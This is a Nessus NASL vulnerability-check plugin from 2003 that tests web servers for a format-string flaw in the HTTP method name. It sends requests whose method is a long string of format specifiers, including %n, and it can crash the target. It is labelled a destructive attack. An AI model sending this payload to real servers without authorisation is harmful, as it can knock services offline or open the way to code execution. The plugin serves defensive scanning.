#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#

if(description)
{
  script_id(11801);
  script_version ("$Revision: 1.1 $");
 
  name["english"] = "Format string on HTTP method name";
  name["francais"] = "Attaque 'format string' sur un nom de méthode HTTP";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote web server seems to be vulnerable to a format string attack.
An attacker might use this flaw to make it crash or even execute 
arbitrary code on this host.


Solution : upgrade your software or contact your vendor and inform him
           of this vulnerability

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Sends an HTTP request with %s as a method";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK); 
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";

 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www");
 exit(0);
}

#
include("http_func.inc");

port = get_kb_item("Services/www");
if (! port) port = 80;

if (! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

#req = http_get(item: "/", port: port);
req = http_get(item: strcat("/nessus", rand(), ".html"), port: port);

soc = http_open_socket(port);
if (! soc) exit(0);
send(socket: soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);

flag = 0; flag2 = 0;
if (egrep(pattern:"[0-9a-fA-F]{4}", string: r)) flag = 1;
##if (flag) display(r);

req2 = ereg_replace(string: req, pattern: "^GET", replace: "%s");

soc = http_open_socket(port);
if (! soc) exit(0);
send(socket: soc, data: req2);
r = http_recv(socket: soc);
http_close_socket(soc);

if (egrep(pattern:"[0-9a-fA-F]{4}", string: r)) flag2 ++;

soc = open_sock_tcp(port);
if (! soc)
{
  security_hole(port);
  exit(0);
}

req2 = ereg_replace(string: req, pattern: "^GET", replace: "%04x%x%s%p%n%d%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%04x%%x%%s%%p%%n%%d%%o%%u%%c%%h%%l%%q%%j%%z%%Z%%t%%i%%e%%g%%f%%a%%C%%S%%04x");

send(socket: soc, data: req2);
r = http_recv(socket: soc);
http_close_socket(soc);

if (egrep(pattern:"[0-9a-fA-F]{4}", string: r)) flag2 ++;

if (http_is_dead(port: port))
{
  security_hole(port);
  exit(0);
}

# Useless code? False positive generator?
#if (flag2 && ! flag) security_warning(port);
